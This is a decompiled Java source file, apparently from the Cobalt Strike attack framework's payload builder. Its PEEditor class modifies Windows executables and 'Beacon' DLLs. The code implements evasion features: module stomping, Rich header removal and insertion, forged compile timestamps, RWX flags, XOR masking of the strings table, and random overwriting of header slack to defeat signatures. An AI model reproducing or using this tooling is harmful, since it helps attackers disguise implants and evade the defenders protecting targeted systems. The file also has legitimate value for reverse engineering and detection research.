package pe;

import common.CommonUtils;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;
import java.util.Iterator;

public class PEEditor {
   protected PEParser info = null;
   protected byte[] data;
   protected byte[] bdata = new byte[8];
   protected ByteBuffer buffer = null;
   protected int origch = 0;

   public byte[] getImage() {
      return this.data;
   }

   public void checkAssertions() {
      this.getInfo();
      short var1 = -8483;
      if ((this.origch & var1) != 0) {
         CommonUtils.print_error("Beacon DLL has a Characteristic that's unexpected\n\tFlags: " + Integer.toBinaryString(var1) + "\n\tOrigc: " + Integer.toBinaryString(this.origch));
      }

   }

   public boolean patchCode(byte[] var1, byte[] var2) {
      int var3 = this.info.get(".text.PointerToRawData");
      int var4 = var3 + this.info.get(".text.SizeOfRawData");
      int var5 = CommonUtils.indexOf(this.data, var1, var3, var4);
      if (var5 == -1) {
         return false;
      } else {
         for(int var6 = 0; var6 < var2.length; ++var6) {
            this.data[var5 + var6] = var2[var6];
         }

         return true;
      }
   }

   public PEParser getInfo() {
      if (this.info == null) {
         this.info = PEParser.load(this.data);
         this.origch = this.getInfo().get("Characteristics");
      }

      return this.info;
   }

   public PEEditor(byte[] var1) {
      this.data = var1;
      this.buffer = ByteBuffer.wrap(this.bdata);
      this.buffer.order(ByteOrder.LITTLE_ENDIAN);
   }

   public void updateChecksum() {
      long var1 = this.getInfo().checksum();
      this.setChecksum(var1);
   }

   public void setModuleStomp(String var1) {
      this.setCharacteristic(16384, true);
      this.setString(64, CommonUtils.randomData(64));
      this.setStringZ(64, var1);
   }

   public void stompPE() {
      this.setCharacteristic(1, true);
   }

   public void insertRichHeader(byte[] var1) {
      this.removeRichHeader();
      if (var1.length != 0) {
         long var2 = (long)this.getInfo().get("e_lfanew");
         this.setValueAt("e_lfanew", var2 + (long)var1.length);
         byte[] var4 = Arrays.copyOfRange(this.data, 0, 128);
         byte[] var5 = Arrays.copyOfRange(this.data, (int)var2, 1024 - var1.length);
         byte[] var6 = CommonUtils.join(var4, var1, var5);
         System.arraycopy(var6, 0, this.data, 0, 1024);
         this.info = PEParser.load(this.data);
      }
   }

   public void removeRichHeader() {
      if (this.getInfo().getRichHeaderSize() != 0) {
         long var1 = (long)this.getInfo().get("e_lfanew");
         this.setValueAt("e_lfanew", 128L);
         byte[] var3 = Arrays.copyOfRange(this.data, 0, 128);
         byte[] var4 = Arrays.copyOfRange(this.data, (int)var1, 1024);
         byte[] var5 = new byte[1024 - (var3.length + var4.length)];
         byte[] var6 = CommonUtils.join(var3, var4, var5);
         System.arraycopy(var6, 0, this.data, 0, 1024);
         this.info = PEParser.load(this.data);
      }
   }

   public void setExportName(String var1) {
      if (!var1.equals(this.getInfo().getString("Export.Name"))) {
         int var2 = CommonUtils.bString(this.data).indexOf(var1 + '\u0000');
         if (var2 > 0) {
            int var3 = this.getInfo().getLocation("Export.Name");
            int var4 = this.getInfo().getPointerForLocation(0, var2);
            this.setLong(var3, (long)var4);
         } else {
            CommonUtils.print_warn("setExportName() failed. " + var1 + " not found in strings table");
         }

      }
   }

   public void setChecksum(long var1) {
      this.setLong(this.getInfo().getLocation("CheckSum"), var1);
   }

   public void setAddressOfEntryPoint(long var1) {
      this.setValueAt("AddressOfEntryPoint", var1);
   }

   public void setEntryPoint(long var1) {
      long var3 = (long)this.getInfo().get("AddressOfEntryPoint");
      this.setValueAt("LoaderFlags", var3);
      this.setCharacteristic(4096, true);
      this.setAddressOfEntryPoint(var1);
   }

   protected void setString(int var1, byte[] var2) {
      for(int var3 = 0; var3 < var2.length; ++var3) {
         this.data[var3 + var1] = var2[var3];
      }

   }

   protected void setStringZ(int var1, String var2) {
      for(int var3 = 0; var3 < var2.length(); ++var3) {
         this.data[var3 + var1] = (byte)var2.charAt(var3);
      }

      this.data[var1 + var2.length()] = 0;
   }

   public int getInt(int var1) {
      this.buffer.clear();

      for(int var2 = 0; var2 < 4; ++var2) {
         this.buffer.put(var2, this.data[var2 + var1]);
      }

      return (int)this.getInfo().fixAddress((long)this.buffer.getInt());
   }

   protected void setLong(int var1, long var2) {
      this.buffer.clear();
      this.buffer.putLong(0, var2);

      for(int var4 = 0; var4 < 4; ++var4) {
         this.data[var4 + var1] = this.bdata[var4];
      }

   }

   protected void setShort(int var1, long var2) {
      this.buffer.clear();
      this.buffer.putShort(0, (short)((int)var2));

      for(int var4 = 0; var4 < 2; ++var4) {
         this.data[var4 + var1] = this.bdata[var4];
      }

   }

   protected void setCharacteristic(int var1, boolean var2) {
      int var3 = this.getInfo().getLocation("Characteristics");
      if (var2) {
         this.origch |= var1;
      } else {
         this.origch &= ~var1;
      }

      this.setShort(var3, (long)this.origch);
   }

   public void setCompileTime(String var1) {
      this.setCompileTime(CommonUtils.parseDate(var1, "dd MMM yyyy HH:mm:ss"));
   }

   public void setCompileTime(long var1) {
      int var3 = this.getInfo().getLocation("TimeDateStamp");
      this.setLong(var3, var1 / 1000L);
   }

   public void setValueAt(String var1, long var2) {
      int var4 = this.getInfo().getLocation(var1);
      this.setLong(var4, var2);
   }

   public void setImageSize(long var1) {
      int var3 = this.getInfo().getLocation("SizeOfImage");
      this.setLong(var3, var1);
   }

   public void setRWXHint(boolean var1) {
      this.setCharacteristic(32768, var1);
   }

   public void stomp(int var1) {
      for(StringBuffer var2 = new StringBuffer(); this.data[var1] != 0; ++var1) {
         var2.append((char)this.data[var1]);
         this.data[var1] = 0;
      }

      this.data[var1] = 0;
   }

   public void mask(int var1, int var2, byte var3) {
      for(int var4 = var1; var4 < var1 + var2; ++var4) {
         byte[] var10000 = this.data;
         var10000[var4] ^= var3;
      }

   }

   protected void maskString(int var1, byte var2) {
      byte[] var10000;
      StringBuffer var3;
      for(var3 = new StringBuffer(); this.data[var1] != 0; ++var1) {
         var3.append((char)this.data[var1]);
         var10000 = this.data;
         var10000[var1] ^= var2;
      }

      var10000 = this.data;
      var10000[var1] ^= var2;
      if (var3.toString().length() >= 63) {
         CommonUtils.print_error("String '" + var3.toString() + "' is >=63 characters! Obfuscate WILL crash");
      }

   }

   public void obfuscate(boolean var1) {
      if (var1) {
         this._obfuscate();
         this.obfuscatePEHeader();
      } else {
         this.setLong(this.getInfo().getLocation("NumberOfSymbols"), 0L);
      }

   }

   public void obfuscatePEHeader() {
      int var1 = this.getInfo().get("e_lfanew");
      byte[] var2 = CommonUtils.randomData(var1 - 64);
      this.setString(64, var2);
      var1 = this.getInfo().get("SizeOfHeaders") - this.getInfo().getLocation("HeaderSlack");
      var2 = CommonUtils.randomData(var1 - 4);
      this.setString(this.getInfo().getLocation("HeaderSlack"), var2);
   }

   protected void _obfuscate() {
      byte var1 = -50;
      this.setLong(this.getInfo().getLocation("NumberOfSymbols"), (long)var1);
      Iterator var2 = this.getInfo().stringIterator();

      while(var2.hasNext()) {
         int var3 = (Integer)var2.next();
         this.maskString(var3, var1);
      }

   }

   public static void main(String[] var0) {
      byte[] var1 = CommonUtils.readFile(var0[0]);
      PEEditor var2 = new PEEditor(var1);
      var2.setCompileTime(System.currentTimeMillis() + 3600000L);
      var2.setImageSize(512000L);
      var2.setRWXHint(true);
      var2.obfuscate(false);
      PEParser var3 = PEParser.load(var2.getImage());
      System.out.println(var3.toString());
   }
}
